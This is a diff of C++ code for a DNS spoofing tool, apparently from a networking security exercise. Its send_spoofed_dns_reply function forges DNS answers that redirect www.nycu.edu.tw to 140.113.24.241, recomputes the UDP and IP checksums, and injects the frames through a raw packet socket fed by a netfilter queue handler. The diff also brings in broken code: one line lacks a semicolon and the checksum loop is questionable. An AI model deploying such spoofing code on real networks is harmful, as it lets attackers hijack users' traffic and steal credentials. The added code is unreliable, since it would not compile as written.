@@ -373,12 +373,7 @@ void send_spoofed_dns_reply(char *packet)
     temp.s_addr = ip_header->saddr;
     ip_header->saddr = ip_header->daddr;
     ip_header->daddr = temp.s_addr;
-    // cout to check the source and destination IP address
-    cout << "Source IP: " << inet_ntoa(*(in_addr *)&ip_header->saddr) << endl;
-    cout << "Destination IP: " << inet_ntoa(*(in_addr *)&ip_header->daddr) << endl;
-    cout << "Protocol: " << ip_header->protocol << endl;
-    cout << "IP Header Length: " << ip_header->ihl * 4 << endl;
-
+    ip_header->protocol = IPPROTO_UDP;
 
     // change the source port and destination port
     struct udphdr *udp_header = (struct udphdr *)(packet + ip_header->ihl * 4);
@@ -403,6 +398,7 @@ void send_spoofed_dns_reply(char *packet)
     // move the pointer to the answer section
     // char *dns_answer = (char *)(packet + ip_header->ihl * 4 + sizeof(udphdr) + sizeof(dnshdr));
     // derive the question section
+    ///////////////////////////////////////////
     while (*dns_query != 0)
     {
         // cout << *dns_query; // www nycu edu tw
@@ -417,6 +413,8 @@ void send_spoofed_dns_reply(char *packet)
     answer->ttl = htonl(5);
     answer->rdlength = htons(4);
     dns_answer += sizeof(answer_section);
+    // cout position of dns_answer
+    // cout << "Position of dns_answer: " << dns_answer - packet << endl;
     // attach the IP 140.113.24.241 address to the answer section
     *dns_answer = 140;
     *(dns_answer + 1) = 113;
@@ -431,37 +429,33 @@ void send_spoofed_dns_reply(char *packet)
     ip_header->tot_len = htons(total_len);
 
     // calculate udp checksum
+    //  packet - ip_header to get the udp datagram
+    struct udphdr *udp_payload = udp_header
+    unsigned short udpLen = htons(udp_payload->len);
     udp_header->check = 0;
-    // pseudo header
-    struct pseudo_header
+    uint32_t sum = 0;
+    sum += (ip_header->saddr >> 16) & 0xFFFF;
+    sum += ip_header->saddr & 0xFFFF;
+    sum += (ip_header->daddr >> 16) & 0xFFFF;
+    sum += ip_header->daddr & 0xFFFF;
+    sum += htons(IPPROTO_UDP);
+    sum += udp_header->len;
+
+    while(udpLen > 1)
     {
-        uint32_t source_address;
-        uint32_t dest_address;
-        uint8_t placeholder;
-        uint8_t protocol;
-        uint16_t udp_length;
-    } psh;
-    psh.source_address = ip_header->saddr;
-    psh.dest_address = ip_header->daddr;
-    psh.placeholder = 0;
-    psh.protocol = IPPROTO_UDP;
-    psh.udp_length = htons(total_len - ip_header->ihl * 4);
-    int psize = sizeof(struct pseudo_header) + total_len - ip_header->ihl * 4;
-    char *pseudogram = (char *)malloc(psize);
-    memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
-    memcpy(pseudogram + sizeof(struct pseudo_header), udp_header, total_len - ip_header->ihl * 4);
-    // calculate the checksum
-    unsigned short *udp_checksum = (unsigned short *)pseudogram;
-    unsigned long sum = 0;
-    for (int i = 0; i < psize / 2; i++)
-    {
-        sum += udp_checksum[i];
+        sum += *udp_payload++;
+        udpLen -= 2;
     }
-    while (sum >> 16)
+    if(udpLen)
+    {
+        sum += *udp_payload & htons(0xFF00);
+    }
+    while(sum >> 16)
     {
         sum = (sum & 0xFFFF) + (sum >> 16);
     }
     udp_header->check = ~sum;
+
 
 
     // calculate the ip checksum
@@ -477,8 +471,6 @@ void send_spoofed_dns_reply(char *packet)
         sum = (sum & 0xFFFF) + (sum >> 16);
     }
     ip_header->check = ~sum;
-
-
 
 
     // send the spoofed DNS reply
@@ -499,12 +491,20 @@ void send_spoofed_dns_reply(char *packet)
     sscanf(dst_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &dst_mac_addr[0], &dst_mac_addr[1], &dst_mac_addr[2],
            &dst_mac_addr[3], &dst_mac_addr[4], &dst_mac_addr[5]);
+
+    cout << "Source IP: " << source_ip << endl;
+    cout << "Source MAC: " << source_mac << endl;
+    cout << "Destination IP: " << dst_ip << endl;
+    cout << "Destination MAC: " << dst_mac << endl;
+
     memcpy(eth_header->ether_dhost, dst_mac_addr, ETH_ALEN);
     eth_header->ether_type = htons(ETH_P_IP);
     // attach the packet with eth header
     char *spoofed_packet = (char *)malloc(total_len + ETHER_HEADER_LEN);
     memcpy(spoofed_packet, eth_header, ETHER_HEADER_LEN);
     memcpy(spoofed_packet + ETHER_HEADER_LEN, packet, total_len);
+
+
     // send the packet
     int sock_raw_fd;
     if ((sock_raw_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP))) == -1)
@@ -520,12 +520,22 @@ void send_spoofed_dns_reply(char *packet)
     socket_address.sll_family = AF_PACKET;
     socket_address.sll_pkttype = PACKET_BROADCAST;
     socket_address.sll_hatype = htons(ARPHRD_ETHER);
-    
+    socket_address.sll_addr[6] = 0x00;
+    socket_address.sll_addr[7] = 0x00;
+
     memcpy(socket_address.sll_addr, source_mac_char, 6);
-    sendto(sock_raw_fd, spoofed_packet, total_len + ETHER_HEADER_LEN, 0, (struct sockaddr *)&socket_address, sizeof(struct sockaddr_ll));
+
+    if(sendto(sock_raw_fd, spoofed_packet, total_len + ETHER_HEADER_LEN, 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) == -1)
+    {
+        cerr << "Error sending packet." << endl;
+    }
 
     close(sock_raw_fd);
-    
+    // free the memory
+    free(eth_header);
+    free(arp_packet);
+    free(spoofed_packet);
+        
 }
 static int dns_nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data)
 {
